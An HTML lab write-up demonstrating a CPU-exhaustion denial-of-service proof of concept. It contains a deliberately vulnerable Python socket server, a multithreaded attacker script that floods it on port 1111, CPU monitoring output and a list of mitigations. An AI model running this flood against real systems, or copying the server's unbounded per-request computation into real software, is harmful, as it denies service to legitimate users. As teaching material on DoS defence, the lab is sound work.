<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CPU Exhaustion Lab</title>
  <style>
    body {
      font-family: monospace, monospace;
      background: #fff;
      color: #000;
      margin: 40px;
      line-height: 1.5;
    }
    h1, h2, h3 {
      text-align: center;
      text-transform: uppercase;
    }
    pre {
      background: #f4f4f4;
      border: 1px solid #000;
      padding: 10px;
      overflow-x: auto;
    }
    code {
      font-family: monospace;
    }
    .section {
      margin-bottom: 40px;
    }
    .log {
      background: #eee;
      border-left: 4px solid #000;
      padding: 10px;
      margin: 10px 0;
    }
  </style>
</head>
<body>

<h1>CPU Exhaustion Proof-of-Concept Lab</h1>

<div class="section">
<h2>Readme</h2>
<p>
This lab demonstrates a proof-of-concept CPU exhaustion attack on a vulnerable server application
running on TCP port <code>1111</code>. Unlike memory exhaustion (where payloads are stored in buffers until memory is consumed), 
this scenario shows how attackers can exploit CPU-intensive operations by sending traffic that triggers expensive computations.
</p>
<p>
The difference between <b>memory exhaustion</b> and <b>CPU exhaustion</b>:
<ul>
  <li><b>Memory exhaustion:</b> The attacker sends oversized payloads. The server stores them, causing memory to grow until the system crashes or slows heavily.</li>
  <li><b>CPU exhaustion:</b> The attacker sends repeated requests that force the server to perform heavy computations, maxing out CPU cores and starving legitimate users of processing power.</li>
</ul>
</p>
</div>

<div class="section">
<h2>Vulnerable Server (server.py)</h2>
<pre><code>import socket
import threading
import math

HOST = "0.0.0.0"
PORT = 1111

def cpu_intensive_task():
    # Arbitrary heavy computation
    x = 0
    for i in range(10_000_000):
        x += math.sqrt(i**2 + i)
    return x

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            # Perform CPU-heavy computation for each received message
            result = cpu_intensive_task()
            conn.sendall(b"Done\n")
    except Exception as e:
        print(f"[-] Error with {addr}: {e}")
    finally:
        conn.close()

def run_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[+] CPU-stress server listening on {HOST}:{PORT}")

    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.start()

if __name__ == "__main__":
    run_server()</code></pre>
</div>

<div class="section">
<h2>Attacker Script (attacker.py)</h2>
<pre><code>import socket
import threading
import time

TARGET_IP = "192.168.209.138"
TARGET_PORT = 1111

NUM_THREADS = 50       # More threads = more CPU load
MESSAGE_COUNT = 100    # Number of messages each thread sends
DELAY_BETWEEN_MSG = 0.01

print_lock = threading.Lock()
success = 0
failed = 0

def cpu_attack_thread(i):
    global success, failed
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        for _ in range(MESSAGE_COUNT):
            s.sendall(b"CPU load\n")
            s.recv(1024)
            time.sleep(DELAY_BETWEEN_MSG)
        s.close()
        with print_lock:
            success += 1
            print(f"[+] Thread {i} done (success={success}, failed={failed})")
    except Exception as e:
        with print_lock:
            failed += 1
            print(f"[-] Thread {i} failed: {e} (success={success}, failed={failed})")

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=cpu_attack_thread, args=(i,))
    threads.append(t)
    t.start()
    time.sleep(0.05)

for t in threads:
    t.join()

print(f"\\n=== CPU attack complete: {success} success, {failed} failed ===")</code></pre>
</div>

<div class="section">
<h2>Status Before Execution</h2>
<pre><code>root@test-server:/home/dipesh# df -h
Filesystem      Size  Used Avail Use% Mounted on
tmpfs           387M  2.0M  385M   1% /run
/dev/sda2       147G   12G  128G   9% /
tmpfs           1.9G     0  1.9G   0% /dev/shm
tmpfs           5.0M  8.0K  5.0M   1% /run/lock
tmpfs           387M  132K  387M   1% /run/user/1000
</code></pre>
</div>

<div class="section">
<h2>Continuous Monitoring</h2>
<pre><code>watch -n 1 "ps -o pid,comm,%cpu,etime -p \$(lsof -ti :1111) | tee -a cpu_log.txt"</code></pre>
</div>

<div class="section">
<h2>After Execution of Attacker Script</h2>
<div class="log">
<p>Sample monitoring output showing CPU load over time:</p>
<pre><code>Before:
 PID COMMAND   %CPU   ELAPSED
 4231 python3   0.4     00:04
 4231 python3   0.3     00:05
 4231 python3   0.2     00:07

Increasing:
 4231 python3  27.9     00:12
 4231 python3  33.8     00:13
 4231 python3  39.1     00:14
 4231 python3  43.5     00:15
 4231 python3  47.4     00:17

Peak:
 4231 python3  95.8     01:54
 4231 python3  95.9     01:55
 4231 python3  96.0     01:56
 4231 python3  96.1     01:58
</code></pre>
</div>
</div>

<div class="section">
<h2>Explanation of Results</h2>
<p>
Each incoming connection forces the server to execute <code>cpu_intensive_task()</code>, a deliberately wasteful computation loop. 
The attacker script opens many concurrent connections and repeatedly sends requests, multiplying CPU load across threads.
</p>
<p>
As shown in the monitoring logs, the CPU usage of the vulnerable server process rapidly rises from negligible (&lt;1%) to near full saturation (~96%). 
This starves the system of CPU cycles, delaying or denying service to legitimate clients.
</p>
</div>

<div class="section">
<h2>Solution / Mitigation</h2>
<ul>
  <li>Do not run arbitrary, heavy computations directly on client requests without validation or limits.</li>
  <li>Introduce <b>rate limiting</b> and <b>workload quotas</b> per client connection.</li>
  <li>Use <b>timeouts</b> and <b>cancellation tokens</b> for long-running tasks.</li>
  <li>Separate expensive computations into <b>worker queues</b> with bounded capacity instead of executing inline.</li>
  <li>Monitor <code>%CPU</code> usage and alert when thresholds (e.g., &gt;70%) are sustained.</li>
  <li>Consider using sandboxing or throttling to prevent a single process from consuming all CPU resources.</li>
</ul>
</div>

</body>
</html>
